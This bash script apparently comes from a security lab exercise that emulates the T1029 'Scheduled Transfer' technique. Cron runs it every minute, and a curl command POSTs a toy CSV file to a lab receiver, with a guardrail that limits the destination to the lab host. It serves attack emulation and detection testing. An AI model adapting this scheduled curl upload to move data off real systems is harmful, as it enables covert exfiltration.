#!/usr/bin/env bash
# ============================================================================
# ATA021 · T1029 Scheduled Transfer — JOB programado (lo lanza cron, NO el operador)
# ----------------------------------------------------------------------------
# Este fichero es el "trabajo" que cron ejecuta cada minuto dentro de la ventana.
# Su cwd ya es la carpeta del ataque (el crontab hace `cd …` antes de invocarlo),
# de modo que el `execve` de bash/curl queda anclado a lab-attack/ATA021.
# Sin secretos. Datos de juguete.
# ============================================================================
set -u

BASE="/home/angel/lab-attack/ATA021"
DATA="${BASE}/dato_programado.csv"
HOST="192.168.65.1"
PORT="9090"
ENDPOINT="http://${HOST}:${PORT}/api/scheduled/dato_programado.csv"

cd "$BASE" || exit 1

# GUARDARRAIL: el destino DEBE ser el receptor del laboratorio (VMnet1 del host).
case "$ENDPOINT" in
  "http://192.168.65.1:9090/"*) : ;;
  *) echo "ERROR: endpoint fuera del receptor del laboratorio (abortado)" >&2; exit 1 ;;
esac

# TRANSFERENCIA programada (execve de curl; cwd=ATA021 -> ancla H4).
curl --silent --show-error --max-time 10 \
  --request POST \
  --header 'Content-Type: text/csv' \
  --data-binary "@${DATA}" \
  --output /dev/null \
  --write-out 'HTTP=%{http_code} enviado=%{size_upload}B\n' \
  "$ENDPOINT"

# Marca local del disparo (para que el guion principal sepa que cron ya ejecuto).
printf '%s\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ)" > "${BASE}/fired.ok"
